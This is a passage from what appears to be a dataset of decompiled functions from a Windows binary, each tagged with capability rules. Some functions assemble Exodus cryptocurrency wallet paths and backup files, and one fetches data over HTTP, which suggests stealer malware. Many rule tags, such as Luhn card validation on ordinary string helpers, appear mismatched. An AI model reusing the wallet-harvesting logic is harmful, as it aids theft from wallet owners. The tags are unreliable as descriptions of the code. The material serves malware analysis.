(cVar1 != '\\0');\n    fcn.004090e0(*0x456f04, pcVar3 - (*0x456f04 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 4;\n    pcVar3 = *0x456ce8;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456ce8, pcVar3 - (*0x456ce8 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 5);\n    pcVar3 = *0x456cd0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456cd0, pcVar3 - (*0x456cd0 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x4571b8;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4571b8, pcVar3 - (*0x4571b8 + 1));\n    var_548h_8 = 6;\n    pcVar3 = *0x456c38;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c38, pcVar3 - (*0x456c38 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 7);\n    pcVar3 = *0x4570a8;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4570a8, pcVar3 - (*0x4570a8 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456e14;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456e14, pcVar3 - (*0x456e14 + 1));\n    var_548h_8 = 8;\n    pcVar3 = *0x456c38;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c38, pcVar3 - (*0x456c38 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 9);\n    pcVar3 = *0x4570a8;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4570a8, pcVar3 - (*0x4570a8 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 10;\n    fcn.004090e0(\"Exodus\\\\exodus.wallet\", 0x14);\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0xb);\n    pcVar3 = *0x456c54;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c54, pcVar3 - (*0x456c54 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x45714c;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x45714c, pcVar3 - (*0x45714c + 1));\n    var_548h_8 = 0xc;\n    pcVar3 = *0x457198;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457198, pcVar3 - (*0x457198 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0xd);\n    pcVar3 = *0x457020;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457020, pcVar3 - (*0x457020 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x457008;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457008, pcVar3 - (*0x457008 + 1));\n    var_548h_8 = 0xe;\n    pcVar3 = *0x45723c;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x45723c, pcVar3 - (*0x45723c + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0xf);\n    pcVar3 = *0x456d7c;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456d7c, pcVar3 - (*0x456d7c + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456c00;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c00, pcVar3 - (*0x456c00 + 1));\n    var_548h_8 = 0x10;\n    pcVar3 = *0x456ef0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456ef0, pcVar3 - (*0x456ef0 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x11);\n    pcVar3 = *0x457134;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457134, pcVar3 - (*0x457134 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 0x12;\n    pcVar3 = *0x456b28;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456b28, pcVar3 - (*0x456b28 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x13);\n    pcVar3 = *0x4571ec;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4571ec, pcVar3 - (*0x4571ec + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 0x14;\n    pcVar3 = *0x456db0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456db0, pcVar3 - (*0x456db0 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x15);\n    pcVar3 = *0x456bf4;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456bf4, pcVar3 - (*0x456bf4 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x457180;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457180, pcVar3 - (*0x457180 + 1));\n    var_548h_8 = 0x16;\n    pcVar3 = *0x457248;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457248, pcVar3 - (*0x457248 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x17);\n    pcVar3 = *0x457238;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457238, pcVar3 - (*0x457238 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456ff0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456ff0, pcVar3 - (*0x456ff0 + 1));\n    var_548h_8 = 0x18;\n    pcVar3 = *0x457248;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457248, pcVar3 - (*0x457248 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x19);\n    pcVar3 = *0x457238;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457238, pcVar3 - (*0x457238 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456c90;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c90, pcVar3 - (*0x456c90 + 1));\n    var_548h_8 = 0x1a;\n    pcVar3 = *0x457248;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457248, pcVar3 - (*0x457248 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x1b);\n    pcVar3 = *0x457238;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x457238, pcVar3 - (*0x457238 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x4571c0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4571c0, pcVar3 - (*0x4571c0 + 1));\n    var_548h_8 = 0x1c;\n    pcVar3 = *0x456b70;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456b70, pcVar3 - (*0x456b70 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x1d);\n    pcVar3 = *0x456c50;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c50, pcVar3 - (*0x456c50 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456eac;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456eac, pcVar3 - (*0x456eac + 1));\n    var_548h_8 = 0x1e;\n    pcVar3 = *0x456b70;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456b70, pcVar3 - (*0x456b70 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x1f);\n    pcVar3 = *0x456c50;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c50, pcVar3 - (*0x456c50 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    pcVar3 = *0x456c94;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456c94, pcVar3 - (*0x456c94 + 1));\n    var_548h_8 = 0x20;\n    pcVar3 = *0x456fa0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456fa0, pcVar3 - (*0x456fa0 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x21);\n    pcVar3 = *0x456f40;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456f40, pcVar3 - (*0x456f40 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(0x44ee14, 3);\n    var_548h_8 = 0x22;\n    pcVar3 = *0x456e88;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456e88, pcVar3 - (*0x456e88 + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x23);\n    pcVar3 = *0x456b90;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456b90, pcVar3 - (*0x456b90 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020();\n    fcn.004090e0(\"*.json\", 6);\n    var_548h_8 = 0x24;\n    pcVar3 = *0x4570ec;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x4570ec, pcVar3 - (*0x4570ec + 1));\n    var_548h_8 = CONCAT31(var_548h_8._1_3_, 0x25);\n    pcVar3 = *0x456f20;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004090e0(*0x456f20, pcVar3 - (*0x456f20 + 1));\n    var_548h_8 = 0xffffffff;\n    fcn.00415020(var_53ch_19, 0);\n    fcn.004158e0(*0x456cc0);\n    fcn.004158e0(*0x457284);\n    fcn.004158e0(*0x456b5c);\n    fcn.004158e0(*0x457240);\n    fcn.00415c30(\"\\\\Exodus\\\\backups\", 0x44ee38, 0x44ee14, *(var_53ch_19 + 0x20));\n    fcn.00434d30(&var_53ch_45, 0, 0x104);\n    fcn.00434d30(&var_538h, 0, 0x104);\n    fcn.00434d30(&var_118h, 0, 0x104);\n    fcn.00434d30(&var_328h, 0, 0x104);\n    fcn.00434d30(&var_220h, 0, 0x104);\n    (**0x457520)(&var_53ch_45, 0x44c8cc);\n    (**0x457520)(&var_53ch_45, *0x456c64);\n    (**0x457520)(&var_53ch_45, 0x44c8cc);\n    (**0x457520)(&var_118h, *0x456c64);\n    (**0x457520)(&var_118h, 0x44c8cc);\n    (**0x457520)(&var_118h, *0x456d64);\n    (**0x457520)(&var_118h, 0x44c8cc);\n    (**0x457520)(&var_118h, *0x457048);\n    (**0x457520)(&var_538h, 0x44c8cc);\n    (**0x457520)(&var_538h, &var_118h);\n    (**0x457520)(&var_538h, 0x44c8cc);\n    (**0x457520)(&var_220h, *0x456c64);\n    (**0x457520)(&var_220h, 0x44c8cc);\n    (**0x457520)(&var_220h, *0x456f3c);\n    arg_8h = &var_328h;\n    (**0x457520)(arg_8h, 0x44c8cc);\n    (**0x457520)(&var_328h, &var_220h);\n    (**0x457520)(&var_328h, 0x44c8cc);\n    fcn.004158e0(&var_53ch_45);\n    fcn.004158e0(&var_538h);\n    fcn.004158e0(&var_328h);\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 7307
    },
    "004170c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004170c0(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_10h;\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    int32_t **extraout_ECX;\n    int32_t *piVar3;\n    int32_t **unaff_EDI;\n    \n    piVar3 = arg_8h[4];\n    ppiVar2 = arg_8h;\n    if (piVar3 < arg_ch) {\n        in_EAX = fcn.0042cb7d(\"invalid string position\");\n        ppiVar2 = extraout_ECX;\n    }\n    piVar3 = piVar3 - arg_ch;\n    if (in_EAX < piVar3) {\n        piVar3 = in_EAX;\n    }\n    if (unaff_EDI != ppiVar2) {\n        cVar1 = fcn.004171f0();\n        if (cVar1 != '\\0') {\n            if (0x7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            ppiVar2 = unaff_EDI;\n            if (0x7 < unaff_EDI[5]) {\n                ppiVar2 = *unaff_EDI;\n            }\n            arg_10h = piVar3 * 2;\n            fcn.0042f700(ppiVar2, arg_8h + arg_ch * 2, arg_10h);\n            unaff_EDI[4] = piVar3;\n            if (0x7 < unaff_EDI[5]) {\n                *(arg_10h + *unaff_EDI) = 0;\n                return;\n            }\n            *(arg_10h + unaff_EDI) = 0;\n        }\n        return;\n    }\n    fcn.00417170();\n    fcn.00417170();\n    return;\n}\n",
        "token_count": 432
    },
    "00417170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00417170(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    uint32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    int32_t **unaff_ESI;\n    \n    piVar2 = unaff_ESI[4];\n    if (piVar2 < param_1) {\n        piVar2 = fcn.0042cb7d(\"invalid string position\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = piVar2 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        ppiVar4 = unaff_ESI;\n        ppiVar1 = unaff_ESI;\n        if (0x7 < unaff_ESI[5]) {\n            ppiVar4 = *unaff_ESI;\n            ppiVar1 = *unaff_ESI;\n        }\n        fcn.0042d8e0(ppiVar4 + param_1 * 2, ppiVar1 + (param_1 + in_EAX) * 2, (uVar3 - in_EAX) * 2);\n        piVar2 = unaff_ESI[4] - in_EAX;\n        unaff_ESI[4] = piVar2;\n        if (0x7 < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar2 * 2) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar2 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "00417240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417240(void)\n\n{\n    uint *in_EAX;\n    uint *unaff_EDI;\n    \n    if (in_EAX != unaff_EDI) {\n        do {\n            if (7 < in_EAX[5]) {\n                fcn.0042d62b(*in_EAX);\n            }\n            in_EAX[5] = 7;\n            in_EAX[4] = 0;\n            *in_EAX = 0;\n            in_EAX = in_EAX + 7;\n        } while (in_EAX != unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "004173f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004173f0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    code *var_10h;\n    uint var_4h;\n    \n    iVar1 = 0;\n    if (param_1 != 0) {\n        if ((param_1 < 0x80000000) && (iVar1 = fcn.0042ddfe(param_1 * 2),  iVar1 != 0)) {\n            return iVar1;\n        }\n        var_4h = 0;\n        fcn.0042d7ec(&var_4h);\n        var_10h = vtable.std::bad_alloc.0;\n        iVar1 = fcn.0042f5f6(&var_10h, 0x4510e8);\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "00417440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00417440(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t arg_8h_00;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441cf9;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h[5] = 0xf;\n    arg_8h[4] = 0;\n    *arg_8h = 0;\n    var_4h = 0;\n    uVar1 = arg_8h[4];\n    arg_8h_00 = *(arg_ch + 0x10) + *(arg_10h + 0x10);\n    if (((uVar1 <= arg_8h_00) && (arg_8h[5] != arg_8h_00)) && (cVar2 = fcn.004093d0(arg_8h_00, 1),  cVar2 != '\\0')) {\n        arg_8h[4] = uVar1;\n        puVar3 = arg_8h;\n        if (0xf < arg_8h[5]) {\n            puVar3 = *arg_8h;\n        }\n        *(puVar3 + uVar1) = 0;\n    }\n    fcn.00409840(arg_ch, 0);\n    fcn.00409840(arg_10h, 0);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 392
    },
    "00417540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417540(void)\n\n{\n    uint unaff_ESI;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&var_44h, 0, 0x40);\n    fcn.00434d30(&var_80h, 0, 0x3c);\n    var_7ch = &var_44h;\n    var_80h = 0x3c;\n    var_78h = 0x40;\n    (**0x457418)();\n    (**0x4573fc)();\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 187
    },
    "00417e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417e20(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    uint var_49ch;\n    uint *var_498h;\n    uint var_494h;\n    uint var_460h;\n    uint var_45ch;\n    uint32_t var_458h;\n    uint var_454h;\n    uint var_54h;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441418;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    var_458h = 1;\n    fcn.00434d30(&var_54h, 0, 0x40, var_14h);\n    fcn.00434d30(&var_49ch, 0, 0x3c);\n    var_498h = &var_54h;\n    var_49ch = 0x3c;\n    var_494h = 0x40;\n    (**0x457418)();\n    iVar1 = (**0x4573fc)();\n    pcVar2 = var_498h;\n    if (iVar1 == 0) {\n        pcVar2 = \"http\";\n    }\n    (**0x457550)(pcVar2, \"https\");\n    uVar3 = (**0x45757c)(0, 99999999);\n    iVar1 = (**0x457504)(uVar3);\n    puVar4 = arg_8h;\n    if (arg_1ch < 0x10) {\n        puVar4 = &arg_8h;\n    }\n    var_45ch = (**0x45745c)(puVar4, 0, 0, 0, 0);\n    var_460h = 600000;\n    (**0x457350)(var_45ch, 2, &var_460h, 4);\n    uVar3 = 0;\n    uVar5 = (**0x457460)(var_45ch);\n    iVar7 = 0;\n    while (var_458h != 0) {\n        (**0x457480)(uVar5, &var_454h, 0x400, &var_458h);\n        uVar6 = 0;\n        if (var_458h == 0) break;\n        do {\n            *(iVar7 + iVar1) = *(&var_454h + uVar6);\n            uVar6 = uVar6 + 1;\n            iVar7 = iVar7 + 1;\n        } while (uVar6 < var_458h);\n    }\n    (**0x457458)(uVar5);\n    (**0x457458)(var_45ch);\n    if (0xf < arg_1ch) {\n        fcn.0042d62b(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar3);\n    return;\n}\n",
        "token_count": 771
    },
    "00418010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418010(int32_t arg_8h)\n\n{\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    code *var_1ch;\n    char *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4412a4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042d14d(0);\n    *(arg_8h + 4) = 0;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0xc) = 0;\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x1c) = 0;\n    *(arg_8h + 0x20) = 0;\n    var_4h = 4;\n    if (unaff_EDI == 0) {\n        var_10h = \"bad locale name\";\n        fcn.0042d7ec(&var_10h);\n        var_1ch = vtable.std::runtime_error.0;\n        fcn.0042f5f6(&var_1ch, 0x451120);\n    }\n    fcn.0042cf74(arg_8h, unaff_EDI);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 375
    },
    "004180b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004180b0(int32_t arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x441204;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 4;\n    fcn.0042cf01(arg_8h);\n    if (*(arg_8h + 0x1c) != 0) {\n        fcn.0042d696(*(arg_8h + 0x1c));\n    }\n    *(arg_8h + 0x1c) = 0;\n    if (*(arg_8h + 0x14) != 0) {\n        fcn.0042d696(*(arg_8h + 0x14));\n    }\n    *(arg_8h + 0x14) = 0;\n    if (*(arg_8h + 0xc) != 0) {\n        fcn.0042d696(*(arg_8h + 0xc));\n    }\n    *(arg_8h + 0xc) = 0;\n    if (*(arg_8h + 4) != 0) {\n        fcn.0042d696(*(arg_8h + 4));\n    }\n    *(arg_8h + 4) = 0;\n    var_4h = 0xffffffff;\n    fcn.0042d175();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 348
    },
    "00418270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00418270(void)\n\n{\n    code **ppcVar1;\n    code **unaff_ESI;\n    uint var_10h;\n    \n    unaff_ESI[1] = NULL;\n    *unaff_ESI = vtable.std::ctype_char_.0;\n    ppcVar1 = fcn.0042d3ae(&var_10h);\n    unaff_ESI[2] = *ppcVar1;\n    unaff_ESI[3] = ppcVar1[1];\n    unaff_ESI[4] = ppcVar1[2];\n    unaff_ESI[5] = ppcVar1[3];\n    return;\n}\n",
        "token_count": 149
    },
    "00418750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418750(void)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fach;\n    uint var_1fa8h;\n    uint var_1fa4h;\n    uint uStackY64;\n    uint arg_8h;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.0043c480();\n    fcn.00434d30();\n    arg_8h_00 = extraout_ECX;\n    (**0x457418)();\n    arg_8h = extraout_ECX;\n    iVar1 = (**0x4574e0)();\n    if (iVar1 != 0) {\n        iVar1 = (**0x4572fc)();\n        if (iVar1 != 0) {\n            uStackY64 = 0x4187d8;\n            iVar1 = (**0x457340)();\n            if (iVar1 == 0) {\n                uStackY64 = 0x41881c;\n                iVar1 = (**0x45731c)();\n                if (iVar1 == 0) {\n                    uStackY64 = 0x41883d;\n                    fcn.0042f700(&fcn.00418750::var_1fa4h, 0, 0);\n                    var_1fa4h._0_1_ = 0;\n                    (**0x457324)();\n                    fcn.0042d636(arg_8h_00);\n                    return;\n                }\n            }\n            (**0x457520)();\n            uStackY64 = 0x418882;\n            (**0x457324)();\n            fcn.0042d636(arg_8h);\n            return;\n        }\n        (**0x457520)();\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 470
    },
    "004189b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004189b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint *unaff_EDI;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = (**0x457428)(&var_14h, 0, 0, 0, 0, 0, &var_ch);\n    if (iVar1 != 0) {\n        *unaff_EDI = var_ch;\n        arg_8h_00 = (**0x4574c8)(0x40, var_ch);\n        *arg_8h = arg_8h_00;\n        if (arg_8h_00 != 0) {\n            fcn.0042f700(arg_8h_00, var_8h, *unaff_EDI);\n        }\n    }\n    uVar2 = (**0x4575c8)(var_8h);\n    return uVar2 & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 256
    },
    "00418c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
